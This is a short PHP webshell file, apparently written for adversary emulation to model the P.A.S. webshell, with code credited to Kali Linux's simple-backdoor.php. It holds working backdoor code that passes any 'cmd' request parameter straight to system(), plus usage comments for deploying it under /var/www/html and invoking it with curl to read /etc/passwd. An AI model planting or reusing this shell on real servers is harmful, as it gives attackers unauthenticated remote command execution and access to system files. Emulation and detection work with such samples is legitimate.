<!--
This is a simple php webshell intended to model
behaviors from P.A.S. webshell

Usage: 

1. Copy this file to a web server directory:
    cp webshell.php /var/www/html/

2. Start a web server to serve webshell
    sudo systemctl start apache2

3. Invoke the web shell with a web browser or HTML client
    curl http://127.0.0.1/new.php?cmd=cat+/etc/passwd

-->

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" <title>Void</title>
</head>

<body>
    <!-- 
    This PHP snippet was taken from Kali Linux:
    /usr/share/webshells/php/simple-backdoor.php
    Original author: DK http://michaeldaw.org 2006 (dead hyperrlink)
    -->
    <?php

    if (isset($_REQUEST['cmd'])) {
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
    }
    ?>
</body>

</html>